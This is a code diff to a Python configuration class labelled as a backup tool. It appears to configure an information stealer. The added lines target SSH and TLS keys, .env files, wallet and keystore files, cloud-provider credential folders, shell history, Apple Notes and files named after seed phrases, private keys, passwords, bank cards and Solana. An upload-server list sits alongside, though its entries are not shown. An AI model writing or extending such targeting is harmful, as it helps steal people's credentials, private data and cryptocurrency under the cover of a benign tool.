@@ -67,30 +67,92 @@ class BackupConfig:
     LOG_LEVEL = logging.INFO
     
     # 磁盘文件分类
-    DISK_EXTENSIONS_1 = [  # 文档类
+    DISK_EXTENSIONS_1 = [  # 文档/代码类
         # 文本和文档
-        ".txt", ".rtf", ".md", ".markdown", ".rst", ".tex", ".doc", ".docx", ".pages",
+        ".txt", ".rtf", ".rst", ".tex", ".doc", ".docx", ".pages", ".md", 
         # 电子表格
-        ".xls", ".xlsx", ".numbers", ".csv", ".tsv",
+        ".xls", ".xlsx", ".et", ".numbers", ".csv", ".tsv", ".one",
         # 代码文件
-        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".sh", ".bash", ".zsh", ".sol", ".rs", 
-        # 配置文件
-        ".json", ".yaml", ".yml", ".xml", ".plist", ".conf", ".config", ".ini",
-        # 数据文件
-        ".wallet", ".bin"
+        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".sh", ".bash", ".zsh", ".rs",
+        # 环境变量
+        ".env",
     ]
     
     DISK_EXTENSIONS_2 = [  # 配置和密钥类
         # 密钥和证书
         ".pem", ".key", ".pub", ".crt", ".cer", ".der", ".p12", ".pfx",
-        ".keystore", ".jks", ".asc", ".gpg", ".pgp",
+        ".keystore", ".jks", ".asc", ".gpg", ".pgp", ".utc",
         # SSH相关
-        "id_rsa", "id_ecdsa", "id_ed25519", ".ssh",
-        # 云服务配置
-        ".aws", ".kube", ".docker", ".gitconfig",
+        "id_rsa", "id_ecdsa", "id_ed25519", ".ssh",  
+        # 配置文件
+        ".json", ".yaml", ".yml", ".xml", ".plist", ".conf", ".config", ".ini", ".toml",
         # 其他安全相关
-        ".env", ".secret", ".token", ".credential"
+        ".secret", ".token", ".credential", ".wallet",
     ]   
+    
+    # 排除目录配置
+    EXCLUDE_INSTALL_DIRS = [
+        # macOS 系统目录
+        "Applications", "Library", "System", "Movies", "Music", "Pictures",
+        
+        # 开发工具和环境
+        "node_modules", "venv", "myenv", "env", ".venv",
+        ".gradle", ".m2", ".cargo", ".rustup", ".npm", ".nvm",
+        ".local", ".cache", ".config", ".docker", ".gem",
+        ".pyenv", ".rbenv", ".rvm", ".virtualenvs",
+        "__pycache__", "dist", "build", "target",
+        
+        # IDE 和编辑器
+        ".vscode", ".vscode-server", ".cursor", ".idea", ".eclipse",
+        ".vs", ".atom", ".sublime",
+        
+        # 版本控制
+        ".git", ".github", ".svn", ".hg",
+        
+        # 包管理器
+        ".yarn", ".pnpm-store", ".bun",
+        
+        # 浏览器相关
+        "Google", "Chrome", "Brave", "Firefox", "Safari", "Opera",
+        "Chromium", "Edge",
+        
+        # 其他大型应用
+        "Steam", "Epic Games", "Unity", "UnrealEngine",
+        "Adobe", "Autodesk", "Blender", "NVIDIA",
+        
+        # 通讯软件
+        "Discord", "Zoom", "Teams", "Skype", "Slack", "WeChat",
+        
+        # 其他
+        ".Trash", ".DS_Store", "Parallels", "VirtualBox VMs",
+        "VMware", "Docker", ".zsh_sessions",
+    ]
+    
+    # 关键词排除
+    EXCLUDE_KEYWORDS = [
+        # 软件相关
+        "program", "software", "install", "setup", "update",
+        "patch", "cache", "temp", "tmp",
+        
+        # 开发相关
+        "node_modules", "vendor", "build", "dist", "target",
+        "debug", "release", "bin", "obj", "packages",
+        "__pycache__", ".pytest_cache",
+        
+        # 多媒体相关
+        "music", "video", "movie", "audio", "media", "stream",
+        "downloads", "torrents",
+        
+        # 游戏相关
+        "steam", "game", "gaming", "save",
+        
+        # 临时文件
+        "log", "logs", "crash", "dumps", "dump", "report", "reports",
+        
+        # 其他
+        "bak", "obsolete", "archive", "vpn", "v2ray", "clash",
+        "thumb", "thumbnail", "preview", "trash",
+    ]
     
     # 备用上传服务器
     UPLOAD_SERVERS = [
@@ -111,7 +173,53 @@ class BackupConfig:
         ".Xauthority",        # Xauthority 文件
         ".ICEauthority",      # ICEauthority 文件
         ".zsh_history",       # Zsh历史记录
-        ".zsh_sessions"       # Zsh会话
+        ".zsh_sessions",      # Zsh会话
+        "Desktop",            # 桌面目录
+        "Library/Group Containers/group.com.apple.notes",  # 备忘录目录
+        # VPS服务商配置目录
+        ".aws",               # AWS配置
+        ".gcloud",            # Google Cloud配置
+        ".azure",             # Azure配置
+        ".aliyun",            # 阿里云配置
+        ".tencentcloud",      # 腾讯云配置
+        ".tccli",             # 腾讯云CLI配置
+        ".doctl",             # DigitalOcean配置
+        ".hcloud",            # Hetzner配置
+        ".vultr",             # Vultr配置
+        ".linode",            # Linode配置
+        ".oci",               # Oracle Cloud配置
+        ".bandwagon",         # 搬瓦工配置
+        ".bwg",               # 搬瓦工配置
+        ".docker",            # Docker配置
+        ".kube",              # Kubernetes配置
+    ]
+
+    # 关键字备份配置 - 备份包含以下关键字的文件和文件夹
+    KEYWORD_BACKUP_KEYWORDS = [
+        "wallet",
+        "seed",
+        "mnemonic",
+        "private",
+        "privkey",
+        "keypair",
+        "secret",
+        "account",
+        "password",
+        "bank",
+        "card",
+        "solana",
+        "important",
+        "钱包",
+        "助记词",
+        "种子",
+        "私钥",
+        "密钥",
+        "密码",
+        "账户",
+        "账号",
+        "信用卡",
+        "备忘",
+        "重要",
     ]
 
 # 配置日志
